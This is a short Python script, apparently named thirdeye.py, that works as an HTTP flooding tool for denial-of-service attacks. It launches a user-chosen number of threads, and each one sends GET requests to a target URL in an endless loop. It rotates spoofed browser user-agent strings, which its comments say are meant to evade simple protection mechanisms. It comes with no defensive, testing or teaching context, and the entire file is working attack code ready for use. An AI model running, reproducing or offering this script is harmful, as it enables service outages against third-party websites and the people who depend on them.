import threading
import requests
import random
import sys
import time

# Basic user-agent spoofing to avoid simple protection mechanisms
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36",
]

# Setting up target
def perform_ddos(url):
    while True:
        try:
            headers = {'User-Agent': random.choice(user_agents)}
            # Sending requests to target URL
            requests.get(url, headers=headers)
            print(f"Packet sent to {url}")
        except requests.exceptions.RequestException:
            print(f"Failed to connect to {url}")
            pass

# Main function to start the threads
def start_attack(url, threads):
    print(f"Starting attack on {url} with {threads} threads.")
    for i in range(threads):
        thread = threading.Thread(target=perform_ddos, args=(url,))
        thread.start()
        time.sleep(0.01)  # Delay to control flood rate

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 thirdeye.py <target_url> <threads>")
        sys.exit(1)

    target_url = sys.argv[1]
    number_of_threads = int(sys.argv[2])

    start_attack(target_url, number_of_threads)
